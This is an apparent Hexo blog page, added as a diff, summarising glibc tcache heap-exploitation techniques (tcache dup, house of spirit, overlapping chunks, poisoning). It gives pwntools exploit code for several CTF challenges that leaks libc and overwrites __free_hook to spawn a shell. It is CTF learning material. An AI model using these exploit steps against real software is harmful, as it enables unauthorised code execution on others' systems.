@@ -1,0 +1,416 @@
+<!DOCTYPE HTML>
+<html class="no-js" lang="zh-CN">
+<!--
+//                            _ooOoo_
+//                           o8888888o
+//                           88" . "88
+//                           (| -_- |)
+//                            O\ = /O
+//                        ____/`---'\____
+//                      .   ' \\| |// `.
+//                       / \\||| : |||// \
+//                     / _||||| -:- |||||- \
+//                       | | \\\ - /// | |
+//                     | \_| ''\---/'' | |
+//                      \ .-\__ `-` ___/-. /
+//                   ___`. .' /--.--\ `. . __
+//                ."" '< `.___\_<|>_/___.' >'"".
+//               | | : `- \`.;`\ _ /`;.`/ - ` : | |
+//                 \ \ `-. \_ __\ /__ _/ .-` / /
+//         ======`-.____`-.___\_____/___.-`____.-'======
+//                            `=---='
+//                 拦截插件累计拦截逗比攻击"1381438"次！
+//         .............................................
+//                  佛祖保佑             永无BUG
+//          佛曰:
+//                  写字楼里写字间，写字间里程序员；
+//                  程序人员写程序，又拿程序换酒钱。
+//                  酒醒只在网上坐，酒醉还来网下眠；
+//                  酒醉酒醒日复日，网上网下年复年。
+//                  但愿老死电脑间，不愿鞠躬老板前；
+//                  奔驰宝马贵者趣，公交自行程序员。
+//                  别人笑我忒疯癫，我笑自己命太贱；
+//                  不见满街漂亮妹，哪个归得程序员？
+-->
+<head><meta name="generator" content="Hexo 3.8.0">
+    <!--[if lte IE 9]>
+<meta http-equiv="refresh" content="0;url=http://yoursite.com/warn.html">
+<![endif]-->
+<meta charset="utf-8">
+
+<meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+
+<meta http-equiv="X-UA-Compatible" content="IE=Edge">
+<meta name="renderer" content="webkit">
+<meta name="viewport" content="width=device-width, initial-scale=1.0,user-scalable=no">
+<meta http-equiv="mobile-agent" content="format=html5; url=http://yoursite.com">
+<meta name="author" content="treebacker">
+<link rel="stylesheet" href="../../../../css/SimpleStyle.min.css">
+
+<link rel="shortcut icon" href="../../../../images/favicon.png">
+
+
+<title>tcache-attack总结 - Watch Security</title>
+
+<meta name="keywords" content="tcache">
+
+<meta name="description " content="libc.26之后的tcache机制安全性">
+
+</head>
+<body>
+<div id="nav">
+    <nav class="nav-menu">
+        <a class="site-name current" href="/" title="Tree">Tree</a>
+        <a class="site-index current" href="/"><i class="fa fa-home"></i><span>首页</span></a>
+        <a href="/archives" title="归档"><i class="fa fa-archives"></i><span>归档</span></a>
+        <a href="/tags" title="标签"><i class="fa fa-tags"></i><span>标签</span></a>
+        <!-- custom single page of menus -->
+        
+        
+        <a href="/help" title="帮助">
+            <i class="fa fa-question-circle"></i>
+            <span>帮助</span>
+        </a>
+        
+    </nav>
+</div>
+
+<div class="nav-user">
+    <a class="btn-search" href="#"><i class="fa fa-search"></i></a>
+    <a class="btn-read-mode" href="#"><i class="fa fa-sun-o"></i></a>
+    <a class="btn-sns-qr" href="javascript:"><i class="fa fa-telegram"></i></a>
+</div>
+
+<div id="wrapper" class="clearfix">
+    <div id="body">
+        <div class="main" id="main">
+            <div id="cover">
+    <div class="cover-img"></div>
+    <div class="cover-info">
+        
+        <h1 class="cover-siteName">Treebacker</h1>
+        <h3 class="cover-siteTitle">愿麦子和麦子长在一起，愿河流与河流流归一处。</h3>
+        <p class="cover-siteDesc">岁月易逝，痕影难觅</p>
+        <div class="cover-sns">
+            
+            <div class="btn btn-github">
+                <a href="https://github.com/treebacker" target="_blank" title="github" ref="friend">
+                    <i class="fa fa-github"></i>
+                </a>
+            </div>
+            
+        </div>
+    </div>
+</div>
+            <div class="page-title">
+    <ul>
+        <li><a href="/">最新</a></li>
+        
+            
+                <li class="active">
+                    <a href="/categories/tech-notes" data-name="技术">技术</a>
+                </li>
+            
+                <li class="">
+                    <a href="/categories/essays" data-name="随笔">随笔</a>
+                </li>
+            
+                <li class="">
+                    <a href="/categories/cdcitizen-of-the-sun" data-name="海子">海子</a>
+                </li>
+            
+                <li class="">
+                    <a href="/categories/others" data-name="其他">其他</a>
+                </li>
+            
+        
+        <li class="page-search">
+    <form id="search" class="search-form">
+        <label for="s" class="sr-only">请输入关键字</label>
+        <input class="search-field" type="text" name="s" placeholder="请输入关键字">
+        <button type="submit" class="search-form-submit" title="搜索"><i class="fa fa-search"></i></button>
+    </form>
+    <div class="ins-search">
+    <div class="ins-search-mask"></div>
+    <div class="ins-search-container">
+        <div class="ins-input-wrapper">
+            <input type="text" class="ins-search-input" placeholder="请输入关键词...">
+            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: '文章',
+            PAGES: '页面',
+            CATEGORIES: '分类',
+            TAGS: '标签',
+            UNTITLED: '(无标题)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '../../../../content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+</li>
+
+    </ul>
+</div>
+<div class="main-inner">
+    <article class="post" itemscope="" itemtype="http://schema.org/BlogPosting">
+        <div class="post-header">
+            <div class="post-author clearfix">
+                <a class="avatar fleft" href="" target="_blank">
+                    <img width="48" src="/images/favicon.png" alt="avatar">
+                </a>
+                <p><span class="label">作者</span>
+                    <a href="" target="_blank">Treebacker</a>
+                    <span title="最后编辑于2019-10-09">2019-10-09</span>
+                </p>
+                <p></p>
+            </div>
+            <h2 class="post-title">tcache-Attack总结</h2>
+            <div class="post-meta">
+                本文总共6914个字 | 您是第<span id="busuanzi_value_page_pv"><i class="fa fa-spinner fa-spin"></i></span>位看到它们的小伙伴
+            </div>
+        </div>
+        <div class="post-content markdown-body">
+            <h3 id="Tcache-Attack总结"><a href="#Tcache-Attack总结" class="headerlink" title="Tcache Attack总结"></a>Tcache Attack总结</h3><h4 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01  前言"></a>0x01  前言</h4><ul>
+<li>heap攻击方式有很多，但是目前多数pwn还是停留在libc2.23这些上面，而在之后的libc版本中引入了一些新的机制，tcache就是其中一个。</li>
+<li>tcache的引入，就目前来看，似乎是让我们<strong>熟悉的攻击方式使用的更便利</strong>,这是因为很多检查机制是在tcache处理之后才开始的，所以无形中敞开了安全的大门。</li>
+</ul>
+<h4 id="0x02-新外衣"><a href="#0x02-新外衣" class="headerlink" title="0x02  新外衣"></a>0x02  新外衣</h4><ul>
+<li><h5 id="实现tcache机制引入的新结构"><a href="#实现tcache机制引入的新结构" class="headerlink" title="实现tcache机制引入的新结构"></a>实现tcache机制引入的新结构</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* We overlay this structure on the user-data portion of a chunk when</span></span><br><span class="line"><span class="comment">   the chunk is stored in the per-thread cache.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* There is one of these for each thread, which contains the</span></span><br><span class="line"><span class="comment">   per-thread cache (hence "tcache_perthread_struct").  Keeping</span></span><br><span class="line"><span class="comment">   overall size low is mildly important.  Note that COUNTS and ENTRIES</span></span><br><span class="line"><span class="comment">   are redundant (we could have just counted the linked list each</span></span><br><span class="line"><span class="comment">   time), this is for performance reasons.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">char</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> __thread tcache_perthread_struct *tcache = <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>这里需要注意的是，tcache是64个单向链表，每个链表最多7个节点(chunk)，chunk的大小在32bit上是12到512（8byte递增）；在64bits上是24到1024（16bytes递增）。</p>
+</li>
+<li><p>当某一个tcache链表满了7个，再有对应的chunk（不属于fastbin的）被free，就直接进入了unsortedbin中。</p>
+</li>
+<li><p>另外一个有趣的是，tcache_perthread_struct结构，一般是在heapbase+0x10（0x8）的位置。对应tcache的数目是char类型。</p>
+</li>
+</ul>
+<h4 id="0x03-旧人新酒"><a href="#0x03-旧人新酒" class="headerlink" title="0x03  旧人新酒"></a>0x03  旧人新酒</h4><ul>
+<li><p><em>Double Free</em> ——<strong>tcache dup</strong></p>
+<ul>
+<li>原来的double free利用，我们需要构成*<em>a-&gt;b-&gt;a</em>这种形式的free’d链，而在tcache中，由于不会检查top，直接可以构成<em>a-&gt;a</em>这种free’d链。利用更方便。</li>
+</ul>
+</li>
+<li><h5 id="Tcahe-house-of-spirit"><a href="#Tcahe-house-of-spirit" class="headerlink" title="Tcahe_house_of_spirit"></a>Tcahe_house_of_spirit</h5><ul>
+<li>与原来的house_of_spirit类似。free掉伪造的chunk，再次malloc获得可操作的地址。但是同样的，这里更简单，free的时候不会对size做前后堆块的安全检查，所以<strong>只需要size满足对齐</strong>就可以成功free掉伪造的chunk（其实就是一个地址）。</li>
+</ul>
+</li>
+<li><h5 id="tcache-overlapping-chunks"><a href="#tcache-overlapping-chunks" class="headerlink" title="tcache_overlapping_chunks"></a>tcache_overlapping_chunks</h5><ul>
+<li>可以说和house of spirit是一个原因，由于size的不安全检查，我们可以修改将被free的chunk的size改为一个较大的值（将别的chunk包含进来），再次分配就会得到一个包含了另一个chunk的大chunk。</li>
+<li>同样的道理，也可以改写pre_size向前overlapping。</li>
+</ul>
+</li>
+<li><h5 id="tcache-poisoning"><a href="#tcache-poisoning" class="headerlink" title="tcache_poisoning"></a>tcache_poisoning</h5><ul>
+<li>这个着眼于tcache新的结构，这里的next指针其实相当于fastbin下的fd指针的作用（而且没有很多的检查），将已经在tcache链表中的chunk的fd改写到目的地址，就可以malloc合适的size得到控制权。</li>
+</ul>
+</li>
+<li><p>需注意，tcache dup和poisoning其实都要求可以use after free，也就是free并没有置null。</p>
+</li>
+</ul>
+<h4 id="0x04-实战检验"><a href="#0x04-实战检验" class="headerlink" title="0x04 实战检验"></a>0x04 实战检验</h4><p><a href="https://github.com/zszcr/ctfrepo/tree/master/tcache" target="_blank" rel="noopener">下载地址</a></p>
+<ul>
+<li><h5 id="tcache-dup——gundam"><a href="#tcache-dup——gundam" class="headerlink" title="tcache dup——gundam"></a>tcache dup——gundam</h5><ul>
+<li><p>功能也是常见的</p>
+<img src="/2019/10/09/tcache-Attack总结/1.png" title="[]">
+<p>特别的是，这里有每个结构有两个chunk，且大小固定</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">gundam</span>&#123;</span></span><br><span class="line">	<span class="keyword">int</span> flag;</span><br><span class="line">	<span class="keyword">char</span>* name;</span><br><span class="line">	<span class="keyword">char</span> type[<span class="number">24</span>];</span><br><span class="line">&#125;<span class="number">0x28</span></span><br><span class="line"></span><br><span class="line">name = <span class="built_in">malloc</span>(<span class="number">0x100</span>)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>主要漏洞，两个chunk的free并不是同步的。其中name的free存在没有置NULL的问题。</p>
+<p>​    <img src="/2019/10/09/tcache-Attack总结/2.png" title="[]"></p>
+</li>
+<li><p>利用方向</p>
+<ul>
+<li>肯定是要想办法泄露libc</li>
+<li>之后用上面的这个可以double free。</li>
+</ul>
+</li>
+<li><p>利用过程</p>
+<ul>
+<li><p>这里name本身就是0x100，不在fastbin范围，所以如果我们把对应的tcache占满了，再次free就会进入unsortedbin。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#fill  up the tcache</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9</span>):</span><br><span class="line">	build(<span class="string">'tree'</span>, <span class="string">'1'</span>)</span><br><span class="line">      </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9</span>):</span><br><span class="line">	destory(i)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>再重新获得，当tcache用完了，就可以拿到unsorted bin的chunk，可以泄露bk指针。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">	build(<span class="string">'ffffffff'</span>, <span class="string">'1'</span>)</span><br><span class="line">      </span><br><span class="line">build(<span class="string">'llllllll'</span>, <span class="string">'1'</span>)						<span class="comment">#use the unsortedbin ,bk points to main-arena</span></span><br><span class="line">visit(<span class="number">7</span>)</span><br><span class="line">p.recvuntil(<span class="string">'llllllll'</span>)</span><br><span class="line">libc.address = u64(p.recvuntil(<span class="string">'\x7f'</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)) - <span class="number">0x3ebca0</span></span><br></pre></td></tr></table></figure>
+<img src="/2019/10/09/tcache-Attack总结/3.png" title="[]">
+</li>
+<li><p>再利用tcache dup覆写__free_hook为system。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">success(<span class="string">'system:&#123;:#x&#125;'</span>.format(system_addr))</span><br><span class="line"><span class="comment">#double free dup</span></span><br><span class="line">destory(<span class="number">1</span>)</span><br><span class="line">destory(<span class="number">0</span>)</span><br><span class="line">destory(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">blow()</span><br><span class="line">build(p64(libc.symbols[<span class="string">'__free_hook'</span>]), <span class="string">'1'</span>)		<span class="comment">#0</span></span><br><span class="line">build(<span class="string">'/bin/sh\x00'</span>, <span class="string">'1'</span>)							<span class="comment">#1</span></span><br><span class="line">build(p64(system_addr), <span class="string">'1'</span>)						<span class="comment">#2 cover 0</span></span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<ul>
+<li><h5 id="overlapping-——-children-tcache"><a href="#overlapping-——-children-tcache" class="headerlink" title="overlapping —— children_tcache"></a>overlapping —— children_tcache</h5><ul>
+<li><p>只提供三个功能，new，show，delete。</p>
+</li>
+<li><p>漏洞分析</p>
+<ul>
+<li><p>会发现不存在溢出、free without null的情况。但是在写入内容时用了strcpy，可以造成<strong>\x00</strong>覆写size字段。</p>
+<img src="/2019/10/09/tcache-Attack总结/4.png" title="[]">
+</li>
+<li><p>free前，填充了heap内容</p>
+<img src="/2019/10/09/tcache-Attack总结/5.png" title="[]">
+</li>
+</ul>
+</li>
+<li><p>利用方向</p>
+<ul>
+<li><p>泄露libc。这个肯定是要想办法用unsortedbin来实现，比较好的思路是合并堆，释放到unsortedbin，且能使unsortedbin和未释放的堆重叠。由于存在null of byte。可以向前overlapping。注意将被更改size的请求大小一定是<strong>0x?f0</strong>。</p>
+</li>
+<li><p>这里有个坑，改写pre_size时存在’\x00’截断（strcpy），所以只能在两个大的chunk之间加一个跳板，用来clean后一个chunk的pre_size和设置size的null。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">new(<span class="number">0x418</span>, <span class="string">'0'</span>)</span><br><span class="line">new(<span class="number">0x20</span>, <span class="string">'1'</span>)</span><br><span class="line">new(<span class="number">0x4f0</span>, <span class="string">'2'</span>)		<span class="comment">#off by null fake to 0x500</span></span><br><span class="line">new(<span class="number">0x20</span>, <span class="string">'3'</span>)</span><br><span class="line">      </span><br><span class="line">delete(<span class="number">0</span>)				<span class="comment">#unsorted bin</span></span><br><span class="line">delete(<span class="number">1</span>)				<span class="comment">#tcache, filled with 0xda</span></span><br><span class="line">      </span><br><span class="line"><span class="comment">#clean pre_size and set size low byte 0x00</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">9</span>):</span><br><span class="line">	new(<span class="number">0x28</span>-i, <span class="string">'a'</span>*(<span class="number">0x28</span>-i))</span><br><span class="line">	delete(<span class="number">0</span>)			<span class="comment">#idx=0 at position 1</span></span><br><span class="line">      </span><br><span class="line"><span class="comment">#set pre_size</span></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x20</span> + p64(<span class="number">0x450</span>)</span><br><span class="line">new(<span class="number">0x28</span>, payload)		<span class="comment">#idx=0 at position 1</span></span><br><span class="line">delete(<span class="number">2</span>)				<span class="comment">#overlapping 0 unlink  to unsortbin</span></span><br><span class="line">						<span class="comment">#unsortedbin is 0x950 chunk0\1\2</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>此时unwortdbin包含了率先分配的0、1、2三个chunk。而0chunk仍然在数组中可访问。</p>
+<img src="/2019/10/09/tcache-Attack总结/6.png" title="[]">
+</li>
+<li><p>这样，我们再申请合适的大小，从unsorted bin切割，使得剩余的unsorted bin与第一个chunk重叠。打印chunk 0的信息，就可以拿到libc</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">new(<span class="number">0x418</span>, <span class="string">'1111'</span>)		<span class="comment">#idx=1 at positon 0</span></span><br><span class="line">show(<span class="number">0</span>)					<span class="comment">#fd is same as the leaved unsorted bin</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>接下来继续从unsortedbin申请，使得数组中有两个相同的指针，可以dup。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#double free</span></span><br><span class="line">new(<span class="number">0x28</span>, <span class="string">'2222'</span>)			<span class="comment">#idx2 same as idx0</span></span><br><span class="line">delete(<span class="number">0</span>)					<span class="comment">#</span></span><br><span class="line">delete(<span class="number">2</span>)					<span class="comment">#</span></span><br><span class="line">      </span><br><span class="line"><span class="comment">#use</span></span><br><span class="line">new(<span class="number">0x28</span>, p64(libc.symbols[<span class="string">'__free_hook'</span>]))		<span class="comment">#idx0</span></span><br><span class="line">new(<span class="number">0x28</span>, <span class="string">'/sh\x00'</span>)						<span class="comment">#idx2</span></span><br><span class="line">new(<span class="number">0x28</span>, p64(libc.address + <span class="number">0x4f322</span>))</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><h5 id="ciscn-2019-final-3"><a href="#ciscn-2019-final-3" class="headerlink" title="ciscn_2019_final_3"></a>ciscn_2019_final_3</h5><ul>
+<li><p>只有new和delete功能</p>
+</li>
+<li><p>漏洞分析，有一个double free</p>
+<img src="/2019/10/09/tcache-Attack总结/8.png" title="[]">
+</li>
+<li><p>值得注意的是，唯一有输出的地方是，在new后会输出堆的地址</p>
+<img src="/2019/10/09/tcache-Attack总结/9.png" title="[]">
+</li>
+<li><p>利用思路</p>
+<ul>
+<li>由于堆的地址可知，要想泄露libc，一定是欺骗glibc，从libc上分配堆。也就是需要将libc地址放在tcache空闲链表的某节点的fd指针上。</li>
+<li>而libc地址，一般会和unsortedbin有关系，所以我们需要建立unsortedbin和tcache的关系，错位地让unsortedbin的指向main_arena的指针作为tcache的fd。</li>
+<li>那么又如何产生unsorted bin呢？只好合并，由于heap地址已知，且存在dup，我们完全可以改写chunk的size，产生overlapping合并。</li>
+<li>之后就是dup利用改写指针。</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<ul>
+<li><p>据上面的思路，请求多个chunk，合并后可以进入unsortbin。</p>
+<ul>
+<li>注意这里的第二个chunk，是为了unsorted bin和 tcache的错位。稍后会看到效果。</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">chunk_0 = add(<span class="number">0</span>, <span class="number">0x78</span>, <span class="string">'\x00'</span>*<span class="number">0x78</span>) </span><br><span class="line">heapbase = chunk_0 - <span class="number">0x11e70</span></span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x00</span>, <span class="string">''</span>)				<span class="comment">#0x20</span></span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x78</span>, <span class="string">'\x22'</span>*<span class="number">0x78</span>)</span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x78</span>, <span class="string">'\x33'</span>*<span class="number">0x78</span>)</span><br><span class="line">add(<span class="number">4</span>, <span class="number">0x78</span>, <span class="string">'\x44'</span>*<span class="number">0x78</span>)</span><br><span class="line">add(<span class="number">5</span>, <span class="number">0x78</span>, <span class="string">'\x55'</span>*<span class="number">0x78</span>)</span><br><span class="line">add(<span class="number">6</span>, <span class="number">0x78</span>, <span class="string">'\x66'</span>*<span class="number">0x78</span>)</span><br><span class="line">add(<span class="number">7</span>, <span class="number">0x78</span>, <span class="string">'\x77'</span>*<span class="number">0x78</span>)</span><br><span class="line">add(<span class="number">8</span>, <span class="number">0x78</span>, <span class="string">'\x88'</span>*<span class="number">0x78</span>)</span><br><span class="line">add(<span class="number">9</span>, <span class="number">0x78</span>, <span class="string">'\x99'</span>*<span class="number">0x78</span>)</span><br><span class="line">add(<span class="number">10</span>, <span class="number">0x78</span>, <span class="string">'\xaa'</span>*<span class="number">0x78</span>)</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<ul>
+<li><p>利用dup，构造overlapping。</p>
+<ul>
+<li>注意，这里其实还有house of spirit，我们把chunk_0 - 0x10地址写入释放的chunk_10的fd指针。多次分配后，会获得chunk_0 - 0x10的一个块，从而改写chunk_0的size。产生overlapping。</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#tcache dup</span></span><br><span class="line"><span class="comment">#to fake chunk'0 size</span></span><br><span class="line">remove(<span class="number">10</span>)</span><br><span class="line">remove(<span class="number">10</span>)</span><br><span class="line">    </span><br><span class="line">add(<span class="number">11</span>, <span class="number">0x78</span>, p64(chunk_0 - <span class="number">0x10</span>))	<span class="comment">#same as 11, fd points to idx0</span></span><br><span class="line">add(<span class="number">12</span>, <span class="number">0x78</span>, p64(chunk_0 - <span class="number">0x10</span>))	<span class="comment">#same as 11 </span></span><br><span class="line">add(<span class="number">13</span>, <span class="number">0x78</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x4a1</span>))	<span class="comment">#same as 0, fake chunk'0 size to 0x4a1</span></span><br><span class="line">    </span><br><span class="line">remove(<span class="number">0</span>)							<span class="comment">#into unsorted bin, fd is libc</span></span><br><span class="line">remove(<span class="number">1</span>)							<span class="comment">#into tcache0</span></span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<pre><code>* 此时的unsortedbin和tcache状态。
+
+  {% asset_img 12.png [] %}
+</code></pre><ul>
+<li><p>让unsorted bin和tcache错位。进而获得libc的堆</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">14</span>,<span class="number">0x78</span>, <span class="string">'\xee'</span>*<span class="number">0x78</span>)		<span class="comment">#same as 1</span></span><br><span class="line">add(<span class="number">15</span>,<span class="number">0</span>, <span class="string">''</span>)					<span class="comment">#same as 0 from unsortedbin</span></span><br><span class="line">    </span><br><span class="line">main_arena = add(<span class="number">16</span>, <span class="number">0</span>,<span class="string">''</span>) <span class="comment">#libc</span></span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<pre><code>​        {% asset_img  11.png [] %}
+</code></pre><ul>
+<li><p>再次dup，覆写__free_hook，get shell。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#double free</span></span><br><span class="line">add(<span class="number">17</span>, <span class="number">0x38</span>, p64(<span class="number">0xdeadbeef</span>))</span><br><span class="line">remove(<span class="number">17</span>)</span><br><span class="line">remove(<span class="number">17</span>)</span><br><span class="line">    </span><br><span class="line">add(<span class="number">18</span>, <span class="number">0x38</span>, p64(libc.symbols[<span class="string">'__free_hook'</span>]))</span><br><span class="line">add(<span class="number">19</span>, <span class="number">0x38</span>, <span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">add(<span class="number">20</span>, <span class="number">0x38</span>, p64(libc.symbols[<span class="string">'system'</span>]))</span><br><span class="line">    </span><br><span class="line">remove(<span class="number">19</span>)</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<ul>
+<li>这个题目挺有意思，比较综合的考察了tcache。unsortbin包含libc地址和tcache的fd相配合，往往有意想不到的效果。</li>
+</ul>
+<ul>
+<li><h5 id="tcache-poisoning-god-the-reum"><a href="#tcache-poisoning-god-the-reum" class="headerlink" title="tcache poisoning (god-the-reum)"></a>tcache poisoning (god-the-reum)</h5><ul>
+<li><p>这个比较简单。漏洞很明显，存在double free，且可以重写fd指针。</p>
+</li>
+<li><p>利用free一个不在tcache范围的chunk，释放到unsorted bin中就可以获得libc。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">new(<span class="number">0x500</span>)		<span class="comment">#0</span></span><br><span class="line">new(<span class="number">0x20</span>)		<span class="comment">#1</span></span><br><span class="line">withdraw(<span class="number">0</span>, <span class="number">0x500</span>)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">'ballance '</span>)</span><br><span class="line">    </span><br><span class="line">libc.address = int(p.recvline().strip(<span class="string">'\x0a'</span>), <span class="number">10</span>) - <span class="number">0x3ebca0</span></span><br><span class="line">success(<span class="string">'libc_address:&#123;:#x&#125;'</span>.format(libc.address))</span><br><span class="line">success(<span class="string">'__free_hook:&#123;:#x&#125;'</span>.format(libc.symbols[<span class="string">'__free_hook'</span>]))</span><br><span class="line">success(<span class="string">'one_gadget:&#123;:#x&#125;'</span>.format(libc.address + <span class="number">0x4f322</span>))</span><br><span class="line">    </span><br><span class="line">withdraw(<span class="number">1</span>, <span class="number">0x20</span>)		</span><br><span class="line">    </span><br><span class="line">develop(<span class="number">1</span>, p64(libc.symbols[<span class="string">'__free_hook'</span>]))		</span><br><span class="line">new(<span class="number">0x20</span>)											<span class="comment">#2</span></span><br><span class="line">new(<span class="number">0x20</span>)											<span class="comment">#3 __free_hook</span></span><br><span class="line">develop(<span class="number">3</span>, p64(libc.address + <span class="number">0x4f322</span>))</span><br><span class="line">    </span><br><span class="line">withdraw(<span class="number">2</span>, <span class="number">0x20</span>)</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="0x05-简单总结"><a href="#0x05-简单总结" class="headerlink" title="0x05 简单总结"></a>0x05 简单总结</h4><ul>
+<li>Tcache机制的引入，增加了堆分配的效率，但也引入了更多的不安全性，让之前很多的代码检查都不在起作用，可以很好的绕过。</li>
